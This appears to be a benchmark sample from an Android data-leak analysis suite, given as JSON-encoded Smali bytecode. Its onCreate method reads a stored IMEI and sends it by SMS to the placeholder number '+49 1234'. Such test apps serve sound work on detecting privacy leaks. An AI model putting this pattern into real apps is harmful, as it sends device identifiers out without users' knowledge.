{"onCreate()V":{"1":"    invoke-super {p0}, Landroid\/app\/Application;->onCreate()V","2":"    sget-object v0, Lde\/ecspride\/ApplicationLifecyle3;->imei:Ljava\/lang\/String;","3":"    if-eqz v0, :cond_15","4":"    invoke-static {}, Landroid\/telephony\/SmsManager;->getDefault()Landroid\/telephony\/SmsManager;","5":"    move-result-object v1","6":"    const\/4 v3, 0x0","7":"    sget-object v4, Lde\/ecspride\/ApplicationLifecyle3;->imei:Ljava\/lang\/String;","8":"    const\/4 v5, 0x0","9":"    const\/4 v6, 0x0","10":"    const-string v2, \"+49 1234\"","11":"    invoke-virtual\/range {v1 .. v6}, Landroid\/telephony\/SmsManager;->sendTextMessage(Ljava\/lang\/String;Ljava\/lang\/String;Ljava\/lang\/String;Landroid\/app\/PendingIntent;Landroid\/app\/PendingIntent;)V","12":"    return-void"},"<init>()V":{"1":"    invoke-direct {p0}, Landroid\/app\/Application;-><init>()V","2":"    return-void"}}